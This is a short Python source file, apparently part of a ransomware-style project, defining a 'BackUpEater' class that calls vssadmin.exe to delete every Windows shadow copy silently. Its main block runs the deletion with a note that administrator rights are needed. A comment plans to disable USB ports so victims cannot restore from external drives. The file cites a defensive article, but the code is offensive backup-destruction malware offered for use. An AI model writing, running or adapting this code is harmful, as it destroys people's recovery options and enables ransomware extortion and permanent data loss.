from Utils import Utils
import subprocess

# https://akshayj0111.medium.com/how-to-secure-yourself-from-malware-misusing-vssadmin-exe-fe9bb2a807cd#:~:text=There%20are%20a%20few%20techniques,Copies%20present%20on%20the%20computer.
class BackUpEater(Utils):
    def __init__(self):
        pass

    def delete_shadowcopies(self):
        #local_drives = self.get_local_drives

        #for ld in local_drives:
        completed = subprocess.Popen([r'c:\Windows\System32\vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'])
        return completed

    #disable usb ports to not restoring from an external drive
        

if __name__ == "__main__":
    #test code here
    utils = Utils()
    cmd = "write-host 'Hello world'"
    ret_value = utils.run_command(cmd)
    print(ret_value)

    # run as administrator is needed
    backupEater = BackUpEater()
    vss_deletion = backupEater.delete_shadowcopies()
    print(vss_deletion)

